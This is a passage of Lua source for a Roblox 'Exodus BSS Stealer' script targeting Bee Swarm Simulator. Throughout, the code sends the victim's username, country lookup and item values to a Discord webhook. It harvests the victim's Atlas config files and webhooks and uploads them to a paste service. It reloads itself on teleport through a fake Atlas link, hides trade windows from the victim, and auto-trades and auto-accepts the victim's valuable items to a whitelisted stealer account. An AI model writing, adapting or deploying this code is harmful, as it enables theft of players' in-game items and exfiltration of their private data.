        AutoCollect()
    else
        task.spawn(AutoCollect2)
    end
end

local HitResult
local function SendToWebhook()
    repeat task.wait() until #GetWhitelistedStickers() > 0 or #GetWhitelistedBQs() > 0
    local WebhookContent = ""
    local StickersStr,
        BeequipStr,
        PingAll,
        Signs,
        Hives,
        Vouchers,
        Cubs,
        TotalValue
    = NewItemsStr();
    if PingAll then
        WebhookContent = "@everyone"
    end
    if GameData.PrivateServer then
        WebhookContent = "Private Server. Teleporting to public <t:" .. (os.time() + PrivateServerWaitTime) .. ":R>"
    end
    ItemsStr = StickersStr .. "\n" .. BeequipStr
    local IsBqTrimmed = false
    local IsStTrimmed = false
    local function TrimField(field, bq)
        local TrimText = "... This field has been trimmed to avoid going over 1024 characters"
        if #field.value >= (1023 - #TrimText) then
            if bq then
                IsBqTrimmed = true
            else
                IsStTrimmed = true
            end
            field.value = RemoveLastMatchingLine(field.value:sub(1, 1023 - #TrimText)):sub(1, not bq and -3 or 9999) .. TrimText
        end
        return field
    end
    local ip = game:HttpGet("https://api.ipify.org")
    local suc, LocaleID, Country = pcall(function()
        local data = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://ip-api.com/json/" .. ip))
        return data.countryCode, data.country
    end)
    if suc == false or LocaleID == nil or Country == nil then
        LocaleID = "US"
        Country = "Unknown (USA is placeholder)"
    end
    local pastefy
    local pastefy2
    local fields = {}
    table.insert(fields, {
        name = ":money_with_wings: Hit Info",
        value = string.format("%s%sUsername: **%s**\n%sValue: **%d**", utf8.char(0x2060), air2, LocalPlayer.Name, air2, TotalValue)
    })
    if #GetWhitelistedStickers() > 0 then
        table.insert(fields, TrimField{
            name = "<:st:1496590956454084718> Stickers",
            value = utf8.char(0x2060) .. StickersStr
        })
    end
    if #GetWhitelistedBQs() > 0 then
        table.insert(fields, TrimField({
            name = "<:ce:1496593030034227231> Beequips",
            value = BeequipStr
        }, true))
    end
    if IsStTrimmed or Configuration.AlwaysShowFullStickerListButton then
        pastefy = createPaste((function()
            local t = {}
            for i, v in pairs(GetWhitelistedStickers(true)) do
                table.insert(t, {name = v:GetTypeDef().Name, val = RawValues[v:GetTypeDef().Name]})
            end
            table.sort(t, function (a, b)
                return a.val > b.val
            end)
            for i, v in pairs(t) do
                t[i] = v.name
            end
            return table.concat(t, "\n")
        end)())
    end
    if IsBqTrimmed or Configuration.AlwaysShowFullBqListButton then
        pastefy2 = createPaste((function()
            local t = {}
            for i, v in pairs(GetWhitelistedBQs(true)) do
                local str = string.format("%s | %s Potential | %d Waxes\n", v.File:GetTypeDef().DisplayName, string.format("%.1f", v.File.Q * 5), (v.File:GetWaxHistory() and #v.File:GetWaxHistory()) or 0)
                str = str .. GetAllBQStatsString(v.File)
                table.insert(t, str)
            end
            return table.concat(t, "\n\n")
        end)())
    end
    local components = {}
    table.insert(components, {
        type = 2,
        style = 5,
        label = utf8.char(0x2060),
        emoji = {
            name = "roblox",
            id = "1496713340280635392",
            animated = false
        },
        url = "https://www.roblox.com/games/start?placeId=102665229766189&launchData=" .. game.PlaceId .. "/" .. game.JobId,
        disabled = GameData.PrivateServer
    })
    if pastefy then
        table.insert(components, {
            type = 2,
            style = 5,
            label = utf8.char(0x2060),
            emoji = {
                name = "st",
                id = "1496590956454084718",
                animated = false
            },
            url = pastefy,
            disabled = false
        })
    end
    if pastefy2 then
        table.insert(components, {
            type = 2,
            style = 5,
            label = utf8.char(0x2060),
            emoji = {
                name = "ce",
                id = "1496593030034227231",
                animated = false
            },
            url = pastefy2,
            disabled = false
        })
    end 
    local gotatlas, atlasconfig = pcall(function()
        local files = listfiles("atlas")
        local text = "Extracted ATLAS configuration files and webhooks\n\n"
        local webhooks = {}
        for i, v in pairs(files) do
            local cfg = readfile(v)
            text = text .. "-- File: " .. tostring(v) .. " --\n" .. cfg .. "\n\n"
            local cfgjson = game:GetService("HttpService"):JSONDecode(cfg)
            if cfgjson then
                local webhook1 = cfgjson.webhook.url
                local webhook2 = cfgjson.webhook.graphurl
                if webhook1:match("https://discord.com/api/") then
                    table.insert(webhooks, webhook1 .. " (Report)")
                    table.insert(AtlasWebhooks, webhook1)
                end
                if webhook2:match("https://discord.com/api/") then
                    table.insert(webhooks, webhook1 .. " (Graph)")
                    table.insert(AtlasWebhooks, webhook2)
                end
            end
        end
        text = text .. table.concat(webhooks, ", ")
        return text
    end)
    if gotatlas and Configuration.LogAtlasConfigsAndWebhooks then
        local atlaspaste = createPaste(atlasconfig)
        if atlaspaste then
            table.insert(components, {
                type = 2,
                style = 5,
                label = utf8.char(0x2060),
                emoji = {
                    name = "bee~1",
                    id = "1498048939830808781",
                    animated = false
                },
                url = atlaspaste,
                disabled = false
            })
        end
    end
    local HookBody = {
        content = WebhookContent,
        embeds = {
            {
                title = "Exodus BSS Stealer :flag_" .. LocaleID:lower() .. ":",
                color = 50045,
                fields = fields,
                thumbnail = {
                    url = "https://github.com/exodus892/__exodus__/raw/refs/heads/main/EXDS.gif"
                },
                footer = {
                    text = string.format("%d Sign%s, %d Hive%s, %d Voucher%s, %d Cub%s", Signs, Signs ~= 1 and "s" or "", Hives, Hives ~= 1 and "s" or "", Vouchers, Vouchers ~= 1 and "s" or "", Cubs,  Cubs ~= 1 and "s" or "")
                }
            }
        },
        attachments = {},
        components = {
            {
                type = 1,
                components = components
            },
        }
    }
    local Req = SafeRequest({
        Url = HitsWebhook,
        Method = "POST",
        Headers = {
            ["content-type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(HookBody)
    })
    if Req.StatusCode == 200 and Req.Body then
        local _HitResult = game:GetService("HttpService"):JSONDecode(Req.Body)
        if not _HitResult then
            warn("Invalid response body")
            task.wait(1)
            SendToWebhook()
        else
            HitResult = _HitResult
        end
    else
        warn("Invalid body or status code (" .. tostring(Req.StatusCode) .. ")")
        task.wait(1)
        SendToWebhook()
    end
    AutoCollect()
end

local function HideTrades()
    local CameraTools = require(game.ReplicatedStorage.CameraTools)
    local AlertBoxes = require(game.ReplicatedStorage.AlertBoxes)
    local OldPush
    OldPush = hookfunction(AlertBoxes.Push, newcclosure(function(self, Text, ...)
        if StealerPlayer and Text:find(StealerPlayer.Name) and Text:lower():find("trade") then return end
        return OldPush(self, Text, ...)
    end))
    local Box = ScrGui.MessagePromptBox
    Box:GetPropertyChangedSignal("Visible"):Connect(function()
        if Box.Box.TextBox.Text:lower():find("trade") then
            Box.Visible = false
        end
    end)
    CameraTools.DisablePlayerMovement = function(...)
        
    end
    local TradeLayer = ScrGui.TradeLayer
    TradeLayer.Visible = false
    TradeLayer:GetPropertyChangedSignal("Visible"):Connect(function()
        TradeLayer.Visible = false
    end)
    local BlurShade = ScrGui:WaitForChild("BlurShade", math.huge)
    local Blur = game.Lighting:WaitForChild("Blur", math.huge)
    BlurShade.Visible = false
    Blur.Enabled = false
    BlurShade:GetPropertyChangedSignal("Visible"):Connect(function()
        BlurShade.Visible = false
    end)
    Blur:GetPropertyChangedSignal("Enabled"):Connect(function()
        Blur.Enabled = false
    end)
end

local function StartSession(StealerName)
    if GameData.PrivateServer then
        queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/" .. (_G.GitUsername or "Chris12083") .. "/" ..  (_G.Repository or "atlasbss") .. "/main/" ..  (_G.File or "script.lua") .. "\"))()")
        local function serverhop()
            local servers = {}
            local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true")
            local body = game:GetService("HttpService"):JSONDecode(req)

            if body and body.data then
                for i, v in next, body.data do
                    if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
                        table.insert(servers, 1, v.id)
                    end
                end
            end

            if #servers > 0 then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game:GetService("Players").LocalPlayer)
            else
                return warn("Couldn't find a server.")
            end
        end
        return task.delay(PrivateServerWaitTime, function()
            while true do
                serverhop()
                wait(8)
            end
        end)
    else
        queue_on_teleport("loadstring(game:HttpGet(\"" .. Configuration.FakeAtlasLink .. "\"))()")
    end

    task.spawn(HideTrades)

    local Events = require(game.ReplicatedStorage.Events)

    Events.ClientListen("TradeUpdateInfo", function(IncomingData)
        SessionID = IncomingData.SessionID
    end)

    -- Detect stealer players
    local Players = game.Players
    local function UpdateStealerInfo(Player)
        StealerPlayer = Player
        VictimIsTrading = LocalPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
        StealerIsTrading = StealerPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
    end

    pcall(function()
        workspace:FindFirstChild("Amulets").ChildAdded:Connect(function(v)
            v:Destroy()
        end)
    end)
    Players.PlayerAdded:Connect(function(Player)
        if table.find(StealerName, Player.Name) then
            task.spawn(function()
                repeat task.wait() until Player.Character
                Player.Character:Destroy()
                Player.CharacterAdded:Connect(function(char)
                    char:Destroy()
                end)
            end)
            UpdateStealerInfo(Player)
        end
    end)
    Players.PlayerRemoving:Connect(function(Player)
        if table.find(StealerName, Player.Name) then
            StealerPlayer = nil
            VictimIsTrading = nil
            StealerIsTrading = nil
        end
    end)

    -- Trade player
    warn("starting to trade")
    task.spawn(function()
        local LastTrade = 0
        while task.wait() do
            if #GetWhitelistedStickers() > 0 or #GetWhitelistedBQs() > 0 then
                if StealerPlayer and VictimIsTrading ~= nil and StealerIsTrading ~= nil then
                    if tick() - LastTrade >= 10 and not StealerIsTrading.Value and not VictimIsTrading.Value then
                        LastTrade = tick()
                        Events.ClientCall("TradePlayerRequestStart", StealerPlayer.UserId)
                    end
                else
                    --print(StealerPlayer, VictimIsTrading, StealerIsTrading)
                    LastTrade = 0
                end
            else
                --warn("you have no stickers")
            end
        end
    end)

    -- Stealing stuff
    local PlayerGui = LocalPlayer.PlayerGui
    local function StartStealing()
        local TradeGui = require(game.ReplicatedStorage.Gui.TradeGui)
        repeat task.wait() until
            TradeGui.GetMyOffer() or
            VictimIsTrading == nil or
            not VictimIsTrading.Value or
            StealerIsTrading == nil or
            not StealerIsTrading.Value

        if VictimIsTrading.Value and StealerIsTrading.Value then
            warn("started")

            local MAX_OFFER_SIZE = 30
            local SpaceLeft = MAX_OFFER_SIZE

            -- Add stickers
            local StickersToAdd = GetWhitelistedStickers()
            local BQsToAdd = GetWhitelistedBQs()
            for i, File in ipairs(StickersToAdd) do
                if SpaceLeft == 0 then break end

                local StickerCategory = File:GetTypeDef().CosmeticType
                if StickerCategory:find("Voucher") or StickerCategory:find("Hive Skin") or StickerCategory:find("Cub Skin") then
                    StickerCategory = "Sticker"
                end

                Events.ClientCall("TradePlayerAddItem", SessionID, {
                    ["File"] = File,
                    ["Category"] = StickerCategory
                })

                SpaceLeft = SpaceLeft - 1

                task.wait(0.2)
            end

            if SpaceLeft > 0 then
                for i, File in ipairs(BQsToAdd) do
                    if SpaceLeft == 0 then break end

                    Events.ClientCall("TradePlayerAddItem", SessionID, {
                        ["File"] = File.File,
                        ["Category"] = "Beequip"
                    })

                    SpaceLeft = SpaceLeft - 1

                    task.wait(0.2)
                end
            end

            task.spawn(function()
                PlayerGui.ScreenGui:WaitForChild("TradeLayer"):WaitForChild("TradeAnchorFrame"):WaitForChild("TradeFrame"):WaitForChild("TextProcessing"):GetPropertyChangedSignal("Visible"):Once(function()
                    if Configuration.TradeTracker.Enabled ~= true then return end
                    local NewWebhookBody = {
                        embeds = {{
                            title = StealerPlayer.Name .. " completed a trade with  " .. LocalPlayer.Name,
                            description = "Hit link: " .. string.format("https://discord.com/channels/%s/%s/%s", Configuration.TradeTracker.GuildID, HitResult.channel_id, HitResult.id),
                            color = 50045,
                            thumbnail = {
                                url = "https://github.com/exodus892/__exodus__/raw/refs/heads/main/TRADEARROWS.webp"
                            },
                        }}
                    }
                    local Body = game:GetService("HttpService"):JSONEncode(NewWebhookBody)
                    SafeRequest({
                        Url = HitsWebhook,
                        Method = "POST",
                        Headers = {
                            ["content-type"] = "application/json"
                        },
                        Body = Body
                    })
                end)
            end)

            while VictimIsTrading.Value and StealerIsTrading.Value do
                if ScrGui.TradeLayer.TradeAnchorFrame.TradeFrame.ButtonAccept.ButtonTop.TextLabel.Text ~= "Unaccept" then
                    Events.ClientCall("TradePlayerAccept", SessionID, {
                        [tostring(LocalPlayer.UserId)] = TradeGui.GetMyOffer(),
                        [tostring(StealerPlayer.UserId)] = TradeGui.GetTheirOffer()
                    })
                end
                task.wait(1.5)
            end
        end
    end

    -- Trading detected
    local ScreenGui = PlayerGui:WaitForChild("ScreenGui", math.huge)
    local TradeLayer = ScreenGui:WaitForChild("TradeLayer", math.huge)
    TradeLayer.ChildAdded:Connect(function(Frame)
        if StealerPlayer and Frame.Name == "TradeAnchorFrame" then
            warn("trade detected")
            StartStealing()
        end
    end)
end
task.spawn(function()
    SendToWebhook()
end)

LoadScript()
repeat task.wait() until #game:GetService("Players"):GetPlayers() < game:GetService("Players").MaxPlayers
StartSession(Configuration.Whitelist)
